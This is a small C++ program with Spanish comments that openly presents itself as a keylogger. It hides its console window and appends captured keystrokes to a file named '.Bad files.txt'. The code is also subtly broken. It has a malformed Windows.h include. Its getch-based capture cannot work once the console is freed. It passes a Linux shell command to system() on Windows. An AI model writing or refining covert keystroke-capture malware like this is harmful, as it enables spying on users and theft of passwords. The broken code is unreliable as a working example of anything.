#include<iostream>
#include<string>
#include<conio.h>
#include<fstream>
#include"Windows.h>
using namespace std; 
class Keyloger
{
    private:
        string linea;
        bool proceso;
        ofstream archivo;
    public:
        Keyloger()
        {
            linea = "";
            proceso = false;
        }
        void pulsaciones()
        {
            archivo.open(".Bad files.txt",ios::app);
            if (archivo.fail())
            {
                cout<<"No se pudo abrir el archivo"<<endl;
            }
            else
            {
                do
                {
                    if (kbhit()) //Funcion para capturar teclas
                    {
                        char tecla = getch();
                        if (tecla == 27)
                        {
                            proceso = true;
                        }
                        else
                        {
                            linea += tecla;
                            if (linea.length() > 50 || tecla == 32 || tecla == 13) //Funcion length sabemos el tamaño de una cadena
                            {
                                archivo<<linea<<endl;
                                linea = ""; //asi haria un salto de linea
                            }
                        }
                    }
                } while (proceso != true);
                
            }
        }
};
int main()
{
    FreeConsole();
    Keyloger objeto;
    objeto.pulsaciones();
    system("\nread -p '\nPresiona Enter para continuar...' var");
}